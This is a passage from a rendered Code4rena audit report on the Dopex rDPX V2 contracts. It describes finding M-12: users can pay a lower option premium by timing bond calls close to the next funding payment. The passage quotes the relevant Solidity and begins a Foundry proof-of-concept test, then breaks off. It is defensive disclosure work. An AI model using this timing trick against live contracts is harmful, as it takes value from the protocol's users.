6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/761\">[M-12] User can avoid paying high premium price by correctly timing his bond call</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/761\">said</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2004\">qpzm</a>, __141345__ (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1969\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1791\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1832\">Tendency</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1389\">nirlin</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1016\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/344\">wallstreetvilkas</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/232\">Nyx</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/166\">0xWaitress</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1833\">RED-LOTUS-REACH</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/735\">peakbolt</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L481-L483\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L481-L483</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L283-L286\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L283-L286</a></p>\n<p>When user execute bond operations and <code>putOptionsRequired</code> is <code>true</code>, the premium that they will pay is depend on time when the bond operations will be executed. This will cause the premium paid by user will be less despite bond the same amount at the same price if they time it correctly.</p>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When user trigger <code>bond</code> or <code>bondWithDelegate</code>, it will call <code>calculateBondCost</code> to calculate <code>rdpxRequired</code> and <code>wethRequired</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L904-L907\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L904-L907</a></p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bond</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxBondId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiptTokenAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_whenNotPaused</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Validate amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Compute the bond cost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt; (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">calculateBondCost</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rdpxBondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weth</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">wethRequired</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update weth reserve</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">reserveAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">reservesIndex</span><span class=\"mtk1\">[</span><span class=\"mtk8\">&quot;WETH&quot;</span><span class=\"mtk1\">]].</span><span class=\"mtk12\">tokenBalance</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// purchase options</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">premium</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">putOptionsRequired</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">premium</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_purchaseOptions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">premium</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rdpxBondId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Stake the ETH in the ReceiptToken contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">receiptTokenAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_stake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// reLP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isReLPActive</span><span class=\"mtk1\">) </span><span class=\"mtk11\">IReLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">reLPContract</span><span class=\"mtk1\">).</span><span class=\"mtk11\">reLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LogBond</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">receiptTokenAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n</details>\n<p>If <code>putOptionsRequired</code> is <code>true</code>, <code>calculateBondCost</code> will calculate the <code>premium</code> users need to pay and add it to <code>wethRequired</code> :</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1192-L1198\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1192-L1198</a></p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculateBondCost</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_rdpxBondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getRdpxPrice</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_rdpxBondId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bondDiscount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">bondDiscountFactor</span><span class=\"mtk1\"> *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">Math</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sqrt</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IRdpxReserve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rdpxReserve</span><span class=\"mtk1\">).</span><span class=\"mtk11\">rdpxReserve</span><span class=\"mtk1\">()) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">) / (</span><span class=\"mtk10\">Math</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sqrt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// 1e8 precision</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bondDiscount</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">100e8</span><span class=\"mtk1\">, </span><span class=\"mtk7\">14</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ((</span><span class=\"mtk12\">RDPX_RATIO_PERCENTAGE</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">bondDiscount</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">)) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ((</span><span class=\"mtk12\">ETH_RATIO_PERCENTAGE</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">bondDiscount</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">)) * </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// if rdpx decaying bonds are being used there is no discount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">RDPX_RATIO_PERCENTAGE</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">ETH_RATIO_PERCENTAGE</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strike</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPerpetualAtlanticVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVault</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      .</span><span class=\"mtk11\">roundUp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">4</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// 25% below the current price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt; </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPerpetualAtlanticVault</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">putOptionsRequired</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;   </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">IPerpetualAtlanticVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVault</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk11\">calculatePremium</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strike</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n</details>\n<p>It can be observed that the provided <code>timeToExpiry</code> is depend on <code>nextFundingPaymentTimestamp</code> and current <code>block.timestamp</code>.</p>\n<p>This has potential leak value issue, since with providing the same amount at the same price (assume the rdpx price will not be that volatile), the user paid less premium by timing the bond near to <code>nextFundingPaymentTimestamp</code>.</p>\n<p>Foundry PoC :</p>\n<p>The goal of this PoC is we try to compare the option price we get, using <code>OptionPricingSimple</code>, providing the same amount and price, with different time. <code>OptionPricingSimple</code> configured with 0.05% minimum price, funding duration 7 days and current <code>rdpxPriceInEth</code> is <code>2e7</code>.</p>\n<p>Compared time 7 days, 6 days, and 1 day before next funding payment.</p>\n<p>Add this test to <code>Unit</code> contract inside <code>/tests/rdpxV2-core/Unit.t.sol</code>, also add <code>import \"forge-std/console.sol\";</code> and <code>import {OptionPricingSimple} from \"contracts/libraries/OptionPricingSimple.sol\";</code> in the contract:</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testOptionPricingTiming</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">OptionPricingSimple</span><span class=\"mtk1\"> </span><span class=\"mtk12\">optionPricingSimple</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 5e6</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">optionPricingSimple</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">OptionPricingSimple</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk7\">5e6</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">rdpxV2Core</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">calculateBondCost</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getUnderlyingPrice</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strike</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roundUp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">4</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// 25% below the current price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;What is the current price&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;What is the strike&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strike</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 7 days before next funding payment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;What is time to expiry initial :&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span 